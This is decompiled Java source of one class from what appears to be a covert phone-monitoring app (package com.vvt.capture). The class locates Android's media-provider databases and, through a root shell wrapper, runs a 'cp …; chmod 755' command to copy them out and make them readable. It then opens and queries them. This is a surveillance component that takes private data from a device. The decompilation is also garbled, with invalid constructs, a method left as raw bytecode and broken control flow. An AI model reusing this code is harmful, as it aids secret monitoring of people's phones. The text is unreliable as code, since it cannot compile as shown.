package com.vvt.capture.c.a.a;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import com.vvt.ak.a;
import com.vvt.base.RunningMode;
import com.vvt.capture.c.c;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.LinuxFile;
import java.io.File;
import java.io.FilenameFilter;
import java.util.ArrayList;
import java.util.Iterator;

public class d
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private static final File[] d;
  
  static
  {
    File[] arrayOfFile = new File[2];
    File localFile = new java/io/File;
    localFile.<init>("/data/data/com.android.providers.media/databases/");
    arrayOfFile[0] = localFile;
    localFile = new java/io/File;
    localFile.<init>("/dbdata/databases/com.android.providers.media/");
    arrayOfFile[1] = localFile;
    d = arrayOfFile;
  }
  
  public static SQLiteDatabase a(String paramString)
  {
    return a(paramString, 17);
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    SQLiteDatabase localSQLiteDatabase = b(paramString, paramInt);
    int i = 5;
    for (;;)
    {
      long l;
      if ((localSQLiteDatabase == null) && (i > 0))
      {
        boolean bool3 = a;
        if (bool3) {}
        l = 1000L;
      }
      try
      {
        Thread.sleep(l);
        localSQLiteDatabase = b(paramString, paramInt);
        i += -1;
        continue;
        boolean bool2 = a;
        if (bool2) {}
        return localSQLiteDatabase;
      }
      catch (InterruptedException localInterruptedException)
      {
        for (;;) {}
      }
    }
  }
  
  public static String a(String paramString, RunningMode paramRunningMode)
  {
    boolean bool1 = a;
    if (bool1) {}
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    File[] arrayOfFile = d;
    String str = "db";
    boolean bool2 = a(arrayOfFile, localStringBuilder, str, paramString, paramRunningMode);
    boolean bool3 = a;
    if ((!bool3) || (bool2))
    {
      bool2 = a;
      if (!bool2) {}
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return localStringBuilder.toString();
      bool2 = a;
      if (!bool2) {}
    }
  }
  
  /* Error */
  public static String a(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: ldc 2
    //   4: astore_3
    //   5: aload_3
    //   6: monitorenter
    //   7: getstatic 15	com/vvt/capture/MyUncaughtExceptionHandler/a/a/d:a	Z
    //   10: istore 4
    //   12: iload 4
    //   14: ifeq +3 -> 17
    //   17: getstatic 15	com/vvt/capture/MyUncaughtExceptionHandler/a/a/d:a	Z
    //   20: istore 4
    //   22: iload 4
    //   24: ifeq +3 -> 27
    //   27: aload_0
    //   28: invokestatic 74	com/vvt/capture/MyUncaughtExceptionHandler/a/a/d:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   31: astore 5
    //   33: iconst_0
    //   34: istore 4
    //   36: aconst_null
    //   37: astore 6
    //   39: aload 5
    //   41: ifnull +27 -> 68
    //   44: aload 5
    //   46: invokevirtual 80	android/database/sqlite/SQLiteDatabase:isDbLockedByCurrentThread	()Z
    //   49: istore 7
    //   51: iload 7
    //   53: ifne +15 -> 68
    //   56: aload 5
    //   58: invokevirtual 83	android/database/sqlite/SQLiteDatabase:isDbLockedByOtherThreads	()Z
    //   61: istore 7
    //   63: iload 7
    //   65: ifeq +47 -> 112
    //   68: getstatic 24	com/vvt/capture/MyUncaughtExceptionHandler/a/a/d:MyUncaughtExceptionHandler	Z
    //   71: istore 7
    //   73: iload 7
    //   75: ifeq +3 -> 78
    //   78: aload 5
    //   80: ifnull +8 -> 88
    //   83: aload 5
    //   85: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   88: iconst_0
    //   89: ifeq +9 -> 98
    //   92: aconst_null
    //   93: invokeinterface 89 1 0
    //   98: aload 5
    //   100: ifnull +8 -> 108
    //   103: aload 5
    //   105: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   108: aload_3
    //   109: monitorexit
    //   110: aload_2
    //   111: areturn
    //   112: ldc 91
    //   114: astore 6
    //   116: iconst_4
    //   117: istore 7
    //   119: iload 7
    //   121: anewarray 4	java/lang/Object
    //   124: astore 8
    //   126: iconst_0
    //   127: istore 9
    //   129: ldc 94
    //   131: astore 10
    //   133: aload 8
    //   135: iconst_0
    //   136: aload 10
    //   138: aastore
    //   139: iconst_1
    //   140: istore 9
    //   142: ldc 96
    //   144: astore 10
    //   146: aload 8
    //   148: iload 9
    //   150: aload 10
    //   152: aastore
    //   153: iconst_2
    //   154: istore 9
    //   156: ldc 98
    //   158: astore 10
    //   160: aload 8
    //   162: iload 9
    //   164: aload 10
    //   166: aastore
    //   167: iconst_3
    //   168: istore 9
    //   170: aload 8
    //   172: iload 9
    //   174: aload_1
    //   175: aastore
    //   176: aload 6
    //   178: aload 8
    //   180: invokestatic 105	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   183: astore 6
    //   185: getstatic 15	com/vvt/capture/MyUncaughtExceptionHandler/a/a/d:a	Z
    //   188: istore 7
    //   190: iload 7
    //   192: ifeq +3 -> 195
    //   195: iconst_0
    //   196: istore 7
    //   198: aconst_null
    //   199: astore 8
    //   201: aload 5
    //   203: aload 6
    //   205: aconst_null
    //   206: invokevirtual 109	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   209: astore 6
    //   211: aload 6
    //   213: ifnonnull +43 -> 256
    //   216: getstatic 19	com/vvt/capture/MyUncaughtExceptionHandler/a/a/d:removeFromPath	Z
    //   219: istore 7
    //   221: iload 7
    //   223: ifeq +3 -> 226
    //   226: aload 6
    //   228: ifnull +10 -> 238
    //   231: aload 6
    //   233: invokeinterface 89 1 0
    //   238: aload 5
    //   240: ifnull -132 -> 108
    //   243: aload 5
    //   245: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   248: goto -140 -> 108
    //   251: astore_2
    //   252: aload_3
    //   253: monitorexit
    //   254: aload_2
    //   255: athrow
    //   256: aload 6
    //   258: invokeinterface 112 1 0
    //   263: istore 7
    //   265: iload 7
    //   267: ifeq +28 -> 295
    //   270: ldc 96
    //   272: astore 8
    //   274: aload 6
    //   276: aload 8
    //   278: invokeinterface 116 2 0
    //   283: istore 7
    //   285: aload 6
    //   287: iload 7
    //   289: invokeinterface 120 2 0
    //   294: astore_2
    //   295: getstatic 15	com/vvt/capture/MyUncaughtExceptionHandler/a/a/d:a	Z
    //   298: istore 7
    //   300: iload 7
    //   302: ifeq +3 -> 305
    //   305: aload 6
    //   307: invokeinterface 89 1 0
    //   312: aload 6
    //   314: ifnull +10 -> 324
    //   317: aload 6
    //   319: invokeinterface 89 1 0
    //   324: aload 5
    //   326: ifnull +8 -> 334
    //   329: aload 5
    //   331: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   334: getstatic 15	com/vvt/capture/MyUncaughtExceptionHandler/a/a/d:a	Z
    //   337: istore 4
    //   339: iload 4
    //   341: ifeq -233 -> 108
    //   344: goto -236 -> 108
    //   347: astore 6
    //   349: iconst_0
    //   350: istore 4
    //   352: aconst_null
    //   353: astore 6
    //   355: getstatic 24	com/vvt/capture/MyUncaughtExceptionHandler/a/a/d:MyUncaughtExceptionHandler	Z
    //   358: istore 7
    //   360: iload 7
    //   362: ifeq +3 -> 365
    //   365: aload_2
    //   366: ifnull +9 -> 375
    //   369: aload_2
    //   370: invokeinterface 89 1 0
    //   375: aload 5
    //   377: ifnull +8 -> 385
    //   380: aload 5
    //   382: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   385: aload 6
    //   387: astore_2
    //   388: goto -54 -> 334
    //   391: astore 11
    //   393: iconst_0
    //   394: istore 4
    //   396: aconst_null
    //   397: astore 6
    //   399: aload 11
    //   401: astore_2
    //   402: aload 6
    //   404: ifnull +10 -> 414
    //   407: aload 6
    //   409: invokeinterface 89 1 0
    //   414: aload 5
    //   416: ifnull +8 -> 424
    //   419: aload 5
    //   421: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   424: aload_2
    //   425: athrow
    //   426: astore_2
    //   427: goto -25 -> 402
    //   430: astore 11
    //   432: aload_2
    //   433: astore 6
    //   435: aload 11
    //   437: astore_2
    //   438: goto -36 -> 402
    //   441: astore 8
    //   443: aload 6
    //   445: astore 11
    //   447: iconst_0
    //   448: istore 4
    //   450: aconst_null
    //   451: astore 6
    //   453: aload 11
    //   455: astore_2
    //   456: goto -101 -> 355
    //   459: astore 8
    //   461: aload 6
    //   463: astore 11
    //   465: aload_2
    //   466: astore 6
    //   468: aload 11
    //   470: astore_2
    //   471: goto -116 -> 355
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	474	0	paramString1	String
    //   0	474	1	paramString2	String
    //   1	110	2	str1	String
    //   251	4	2	localObject1	Object
    //   294	131	2	localObject2	Object
    //   426	7	2	localObject3	Object
    //   437	34	2	localObject4	Object
    //   4	249	3	localClass	Class
    //   10	439	4	bool1	boolean
    //   31	389	5	localSQLiteDatabase	SQLiteDatabase
    //   37	281	6	localObject5	Object
    //   347	1	6	localException1	Exception
    //   353	114	6	localObject6	Object
    //   49	25	7	bool2	boolean
    //   117	3	7	i	int
    //   188	78	7	bool3	boolean
    //   283	5	7	j	int
    //   298	63	7	bool4	boolean
    //   124	153	8	localObject7	Object
    //   441	1	8	localException2	Exception
    //   459	1	8	localException3	Exception
    //   127	46	9	k	int
    //   131	34	10	str2	String
    //   391	9	11	localObject8	Object
    //   430	6	11	localObject9	Object
    //   445	24	11	localObject10	Object
    // Exception table:
    //   from	to	target	type
    //   7	10	251	finally
    //   17	20	251	finally
    //   27	31	251	finally
    //   92	98	251	finally
    //   103	108	251	finally
    //   231	238	251	finally
    //   243	248	251	finally
    //   317	324	251	finally
    //   329	334	251	finally
    //   334	337	251	finally
    //   369	375	251	finally
    //   380	385	251	finally
    //   407	414	251	finally
    //   419	424	251	finally
    //   424	426	251	finally
    //   44	49	347	java/lang/Exception
    //   56	61	347	java/lang/Exception
    //   68	71	347	java/lang/Exception
    //   83	88	347	java/lang/Exception
    //   119	124	347	java/lang/Exception
    //   136	139	347	java/lang/Exception
    //   150	153	347	java/lang/Exception
    //   164	167	347	java/lang/Exception
    //   174	176	347	java/lang/Exception
    //   178	183	347	java/lang/Exception
    //   185	188	347	java/lang/Exception
    //   205	209	347	java/lang/Exception
    //   44	49	391	finally
    //   56	61	391	finally
    //   68	71	391	finally
    //   83	88	391	finally
    //   119	124	391	finally
    //   136	139	391	finally
    //   150	153	391	finally
    //   164	167	391	finally
    //   174	176	391	finally
    //   178	183	391	finally
    //   185	188	391	finally
    //   205	209	391	finally
    //   216	219	426	finally
    //   256	263	426	finally
    //   276	283	426	finally
    //   287	294	426	finally
    //   295	298	426	finally
    //   305	312	426	finally
    //   355	358	430	finally
    //   216	219	441	java/lang/Exception
    //   256	263	441	java/lang/Exception
    //   276	283	441	java/lang/Exception
    //   287	294	441	java/lang/Exception
    //   295	298	459	java/lang/Exception
    //   305	312	459	java/lang/Exception
  }
  
  private static boolean a(String paramString, File paramFile, StringBuilder paramStringBuilder)
  {
    bool1 = true;
    boolean bool2 = false;
    boolean bool3 = a;
    if (bool3) {}
    String str1 = paramFile.getName();
    str1 = p.a(paramString, str1);
    int i = 4;
    Object[] arrayOfObject = new Object[i];
    String str2 = c.a(paramString);
    arrayOfObject[0] = str2;
    str2 = paramFile.getAbsolutePath();
    arrayOfObject[bool1] = str2;
    arrayOfObject[2] = str1;
    int j = 3;
    arrayOfObject[j] = str1;
    String str3 = String.format("%s cp %s %s; chmod 755 %s", arrayOfObject);
    try
    {
      KMShell.a(str3);
      paramStringBuilder.append(str1);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (bool1) {}
        bool1 = false;
      }
    }
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  public static boolean a(File[] paramArrayOfFile, StringBuilder paramStringBuilder, String paramString1, String paramString2, RunningMode paramRunningMode)
  {
    int i = 1;
    boolean bool1 = false;
    boolean bool2 = a;
    if (bool2) {}
    int i2 = paramArrayOfFile.length;
    int i3 = 0;
    Object localObject1;
    Object localObject2;
    ArrayList localArrayList;
    boolean bool4;
    if (i3 < i2)
    {
      localObject1 = paramArrayOfFile[i3];
      bool2 = ((File)localObject1).exists();
      if (bool2)
      {
        bool2 = a;
        if (bool2) {}
        localObject2 = RunningMode.LIMITED_1;
        Object localObject3;
        Object localObject4;
        if (paramRunningMode == localObject2)
        {
          localObject2 = LinuxFile.a(((File)localObject1).getPath(), i);
          localArrayList = new java/util/ArrayList;
          localArrayList.<init>();
          localObject3 = ((ArrayList)localObject2).iterator();
          for (;;)
          {
            bool2 = ((Iterator)localObject3).hasNext();
            if (!bool2) {
              break;
            }
            localObject2 = ((LinuxFile)((Iterator)localObject3).next()).d();
            boolean bool7 = a;
            if (bool7) {}
            localObject4 = "external";
            bool7 = ((String)localObject2).startsWith((String)localObject4);
            if (bool7)
            {
              localObject4 = ".db";
              bool7 = ((String)localObject2).endsWith((String)localObject4);
              if (bool7)
              {
                localObject4 = new java/io/File;
                ((File)localObject4).<init>((File)localObject1, (String)localObject2);
                localArrayList.add(localObject4);
              }
            }
          }
          int j = localArrayList.size();
          localObject2 = new File[j];
          localObject2 = (File[])localArrayList.toArray((Object[])localObject2);
          localObject1 = localObject2;
        }
        for (;;)
        {
          if (localObject1 != null)
          {
            boolean bool3 = a;
            if (bool3) {}
            int k = localObject1.length;
            if (k > i)
            {
              int m = 0;
              localObject2 = null;
              for (;;)
              {
                int i4 = localObject1.length;
                if (m >= i4) {
                  break label549;
                }
                localArrayList = localObject1[m];
                localObject3 = localArrayList.getName();
                localObject4 = "ffffffff";
                boolean bool8 = ((String)localObject3).contains((CharSequence)localObject4);
                if (!bool8) {
                  break;
                }
                m += 1;
              }
              localObject2 = new com/vvt/capture/c/a/a/e;
              ((e)localObject2).<init>();
              localObject2 = ((File)localObject1).listFiles((FilenameFilter)localObject2);
              localObject1 = localObject2;
              continue;
              localObject2 = RunningMode.LIMITED_1;
              if (paramRunningMode == localObject2)
              {
                bool4 = a(paramString2, localArrayList, paramStringBuilder);
                if (bool4) {
                  break label394;
                }
                bool4 = a;
                if (!bool4) {
                  break;
                }
              }
            }
          }
        }
      }
    }
    for (;;)
    {
      return bool1;
      localObject2 = localArrayList.getAbsolutePath();
      paramStringBuilder.append((String)localObject2);
      label394:
      bool4 = a;
      if (bool4) {}
      bool4 = a;
      if (bool4) {}
      bool4 = a;
      if (bool4) {}
      bool1 = i;
      continue;
      int n = localObject1.length;
      if (n == i)
      {
        localObject2 = localObject1[0];
        localObject1 = RunningMode.LIMITED_1;
        if (paramRunningMode == localObject1)
        {
          bool5 = a(paramString2, (File)localObject2, paramStringBuilder);
          if (!bool5)
          {
            bool5 = a;
            if (!bool5) {
              continue;
            }
          }
        }
        else
        {
          localObject2 = ((File)localObject2).getAbsolutePath();
          paramStringBuilder.append((String)localObject2);
        }
        boolean bool5 = a;
        if (bool5) {}
        bool5 = a;
        if (bool5) {}
        bool5 = a;
        if (bool5) {}
        bool1 = i;
        continue;
        bool5 = a;
        if (!bool5) {}
      }
      for (;;)
      {
        label549:
        int i1 = i3 + 1;
        i3 = i1;
        break;
        bool6 = a;
        if (!bool6) {}
      }
      boolean bool6 = a;
      if (bool6) {}
      bool6 = a;
      if (!bool6) {}
    }
  }
  
  private static SQLiteDatabase b(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    try
    {
      File localFile = new java/io/File;
      localFile.<init>(paramString);
      bool = localFile.exists();
      if (!bool)
      {
        bool = c;
        if (!bool) {}
      }
      bool = false;
      localFile = null;
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/a/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */